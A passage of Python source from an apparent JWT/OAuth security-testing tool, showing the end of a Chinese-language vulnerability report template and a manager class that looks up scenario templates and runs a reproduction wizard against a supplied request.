- 严重性: {self.scenario.severity.value if vulnerability_found else 'N/A'}

## 测试步骤
{chr(10).join(self.scenario.test_steps)}

## 预期结果
{self.scenario.expected_result}

## 修复建议
{self.scenario.remediation}

## MITRE ATT&CK映射
- 技术ID: {self.scenario.mitre_id}
"""

        return report


# =============================================================================
# Main Scenarios Manager
# =============================================================================

class JWTOAuthScenariosManager:
    """Main JWT/OAuth scenarios coordination engine.

    Integrates scenario template library and one-click reproduction
    wizard for guided vulnerability testing.

    Attributes:
        template_library: Scenario template library
    """

    def __init__(self) -> None:
        """Initialize the JWT/OAuth scenarios manager."""
        self.template_library = ScenarioTemplateLibrary()

    def get_scenario_template(
        self, scenario_id: str
    ) -> Optional[ScenarioTemplate]:
        """Get scenario template by ID.

        Args:
            scenario_id: Scenario identifier.

        Returns:
            ScenarioTemplate if found.
        """
        return self.template_library.get_template(scenario_id)

    def get_all_scenarios(self) -> List[ScenarioTemplate]:
        """Get all scenario templates.

        Returns:
            List of all ScenarioTemplate.
        """
        return self.template_library.get_all_templates()

    def create_wizard(
        self,
        scenario_id: str,
        request_url: str,
        request_headers: Dict[str, str],
        request_body: str = "",
    ) -> Optional[OneClickReproductionWizard]:
        """Create a reproduction wizard for a scenario.

        Args:
            scenario_id: Scenario identifier.
            request_url: Original request URL.
            request_headers: Original request headers.
            request_body: Original request body.

        Returns:
            OneClickReproductionWizard if scenario found.
        """
        scenario = self.template_library.get_template(scenario_id)
        if not scenario:
            return None

        return OneClickReproductionWizard(
            scenario, request_url, request_headers, request_body
        )

    async def run_scenario(
        self,
        scenario_id: str,
        request_url: str,
        request_headers: Dict[str, str],
        request_body: str = "",
        timeout: int = 10,
    ) -> Optional[WizardResult]:
        """Run a complete scenario with wizard.

        Args:
            scenario_id: Scenario identifier.
            request_url: Original request URL.
            request_headers: Original request headers.
            request_body: Original request body.
            timeout: Request timeout in seconds.

        Returns:
            WizardResult if scenario found.
        """
        wizard = self.create_wizard(
            scenario_id, request_url, request_headers, request_body
        )

        if not wizard:
            return None

        return await wizard.execute_wizard(timeout)
